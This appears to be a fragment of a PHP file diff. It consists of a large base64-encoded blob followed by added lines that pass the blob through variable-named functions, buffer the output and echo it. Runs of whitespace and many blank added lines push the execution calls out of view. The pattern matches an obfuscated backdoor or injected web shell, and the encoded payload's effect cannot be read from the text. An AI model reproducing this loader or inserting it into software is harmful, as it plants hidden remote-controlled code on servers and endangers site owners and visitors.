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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
